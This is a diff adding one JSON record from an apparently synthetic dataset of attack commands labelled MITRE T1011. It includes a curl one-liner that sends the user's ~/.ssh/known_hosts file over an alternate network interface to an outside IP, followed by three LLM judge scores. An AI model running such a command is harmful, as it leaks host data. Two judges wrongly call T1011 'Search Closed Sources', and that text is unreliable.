@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "curl --interface \"$(networksetup -getinfo 'USB 10/100/1000 LAN' | awk -F': ' '/IP address/{print $2}')\" --retry 0 --data-binary @/Users/$USER/.ssh/known_hosts https://203.0.113.60:51443/i",
+  "explanation": "Performs HTTPS exfiltration by binding curl to a USB Ethernet adapter interface, leveraging a non-primary medium (T1011).",
+  "rationale_steps": [
+    "Retrieve USB Ethernet IP via networksetup",
+    "Bind HTTP client to that alternate medium",
+    "Transmit data to an uncommon TLS port"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-641961f7-f7f3a725",
+  "source_prompt_hash": "641961f7",
+  "timestamp_utc": "2025-09-30T08:21:35.084142Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command substitution, valid curl flags, and correct use of awk for parsing the network interface information.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does perform exfiltration over HTTPS, it doesn't align with T1011 (Exfiltration Over Other Network Medium) as claimed, since T1011 refers to searching closed sources for intelligence gathering, not data exfiltration techniques.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T13:52:22.530902Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid `curl` flags, correct command substitution for extracting the IP address, and proper file referencing.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration from the host, which is the opposite action of 'acquiring or querying non-public information' from external sources as described in T1011 Search Closed Sources.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T13:52:34.626501Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid curl flags, and correct command substitution.",
+        "semantic_score": 4,
+        "semantic_justification": "It attempts HTTPS exfiltration of known_hosts while binding to the USB Ethernet IP via --interface, but success hinges on that adapter having an IP and a matching TLS cert (no --insecure), and the T1011 mapping is somewhat debatable.",
+        "combined_score": 4.5,
+        "confidence": 0.78,
+        "timestamp": "2025-10-02T13:53:23.503274Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
